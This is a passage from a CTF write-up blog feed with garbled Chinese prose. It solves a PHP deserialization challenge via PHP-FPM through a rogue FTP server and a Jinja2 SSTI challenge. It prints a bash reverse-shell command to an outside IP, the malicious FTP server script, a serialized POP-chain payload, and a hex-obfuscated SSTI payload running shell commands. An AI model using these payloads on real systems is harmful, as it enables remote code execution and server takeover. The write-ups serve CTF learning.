&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;code&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ëøô‰∏™È¢òÔºåÊÄé‰πàËØ¥ ËøòÊòØÊàëÂ§™Âπ¥ËΩª‰∫Ü Êàë‰ª•‰∏∫Ëøô‰∏™Â∞±ÊòØÁÆÄÂçïÁöÑÂèçÂ∫èÂàóÂåñ+shellÂÜôÂÖ•ÔºåÁÑ∂ÂêéÈùûÂ∏∏ÁöÑÁñëÊÉë‰∏∫Âï•Êú¨Âú∞ÂèØ‰ª•‰ΩÜÊòØËøúÁ®ãÁöÑshellÊ≠ªÊ¥ªÂ∞±ÊòØ‰∏çËêΩÂú∞Ôºå‰∏ÄÁõ¥Âú®ÊÉ≥ÊÄé‰πàÁªïËøáÔºåËøôÊòØÂΩìÊó∂Â∞ùËØïÁöÑexp.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Check&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str4&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$esle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$bypass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$welcome&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$esle&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$bypass&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">// $bypass -&amp;gt; str4 = &amp;#39;phpinfo&amp;#39;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$bypass&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$welcome&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$welcome&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$bunny&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;op.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;xyz&amp;#34;&lt;/span>
&lt;span style="color:#111">$payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$esle&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Áõ¥Âà∞ËµõÂêéÊâçÁü•ÈÅìËøôÂèàÂèàÂèàÊòØfpmÔºåÈúÄË¶ÅÁî®ftpÊâìfpmÔºåÂÖ∑‰ΩìÁöÑÂÜÖÂÆπÊàëÊúÄËøë‰πüÊ≠£Âú®ÊÄªÁªìÔºåÂèØ‰ª•ÂèÇËßÅ-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/11/15/attack-php-fpm-study-notes/">ÊîªÂáª PHP-FPM Â≠¶‰π†Á¨îËÆ∞&lt;/a>ÔºàËøòÊ≤°ÂÖ®ÈÉ®Êî∂Â∞æÔºâ&lt;/p>
&lt;p>È¶ñÂÖàÊòØ‰æùÊçÆpÁâõÁöÑËÑöÊú¨ÁîüÊàê‰∏Ä‰∏™urlencodeÁöÑpayloadÔºàËøôÈáåÂºïÂè∑ÊúâÈóÆÈ¢òÁöÑËØùÁõ¥Êé•ÊîπËÑöÊú¨ÂêßÔºâ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span> -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php exec(&amp;#34;bash -c \&amp;#39;&lt;/span>/bin/bash -i &amp;gt;&lt;span style="color:#111">&amp;amp;&lt;/span> /dev/tcp/101.35.114.107/8426 0&amp;gt;&lt;span style="color:#111">&amp;amp;&lt;/span>1&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;);?&amp;gt;&amp;#39;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÁÑ∂ÂêéÂºÄ‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">8001&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 welcome&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#Service ready for new user.&lt;/span>
&lt;span style="color:#75715e">#Client send anonymous username&lt;/span>
&lt;span style="color:#75715e">#USER anonymous&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#User name okay, need password.&lt;/span>
&lt;span style="color:#75715e">#Client send anonymous password.&lt;/span>
&lt;span style="color:#75715e">#PASS anonymous&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#User logged in, proceed. Logged out if appropriate.&lt;/span>
&lt;span style="color:#75715e">#TYPE I&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#Size /&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;550 Could not get the file size.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#EPSV (1)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 ok&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#PASV&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">#STOR / (2)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Permission denied.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#QUIT&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;endd&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰øÆÊîπ‰πãÂâçÁöÑÂèçÂ∫èÂàóÂåñexp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxxxxxxxxxxxxxxx&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ftp://101.35.114.107:8001/aaa&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">())));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>getÊñπÂºè‰º†ÂÖ•ÔºåÂêåÊó∂vps‰∏äÂºÄ‰∏Ä‰∏™ftp-serverÂíå‰∏Ä‰∏™ÁõëÂê¨ÂèçÂºπshellÁöÑÁ´ØÂè£ÔºåÂç≥ÂèØÊãøflag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116141329800.png" alt="image-20211116141329800">&lt;/p>
&lt;h2 id="magicmail">MagicMail&lt;/h2>
&lt;p>ÂéüÈ¢òÔºåsstiÂ•óÂ£≥ÔºåÂèÇËßÅ-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/#webmega-mailer">[DeconstruCTF 2021]Mega Mailer&lt;/a>Ôºå‰ΩÜÊòØÊØîËµõÁöÑÊó∂ÂÄôÊàëÊ≤°Âá∫ÔºåÊòØÊàëÁöÑÈóÆÈ¢òÔºåÂπ≥Êó∂ÊãøÁé∞ÊàêÁöÑpayloadÊ¢≠ÊÉØ‰∫ÜÔºåËá™Â∑±ÊûÑÈÄ†ÁöÑÊó∂ÂÄôÂ∞±Èú≤‰∫ÜÊÄØ&lt;/p>
&lt;p>payloadÁöÑÊûÑÈÄ†ÂèÇËßÅ-&amp;gt;&lt;a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">Jinja2 SSTI filter bypasses&lt;/a>Ôºå‰ΩøÁî®&lt;code>attr()&lt;/code>+hexÂ≠óÁ¨¶‰∏≤ÁöÑÊñπÂºèÊääÂü∫Á°ÄpayloadÁªôÊãºÂá∫Êù•&lt;/p>
&lt;pre tabindex="0">&lt;code>sender=&amp;amp;receiver=&amp;amp;subject=&amp;amp;message={{()|attr(&amp;quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&amp;quot;)()|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(180)|attr(&amp;quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(&amp;quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(&amp;quot;\x65\x76\x61\x6c&amp;quot;)(&amp;quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x27\x29\x2e\x72\x65\x61\x64\x28\x29&amp;quot;)}}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># ÂéüÊú¨ÁöÑÊ†∑Â≠ê&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">subclasses&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">180&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag&amp;#39;).read()&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>CTFshow1121ÂáªÂâëÊùØ Wp</title><link>https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/</link><pubDate>Tue, 16 Nov 2021 03:00:57 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/</guid><description>&lt;h2 id="ÁªôÊàëÁúãÁúã">ÁªôÊàëÁúãÁúã&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type: text/html;charset=utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$your_answer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$useless&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshowÁ¨¨‰∏ÄÊ∑±ÊÉÖ&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">your_answer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;Only you know&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">useless&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;I_love_u&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">$you_never_know&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$you_never_know&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">your_answer&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;s&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;ÁªôÊàëÁúãÁúã!&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
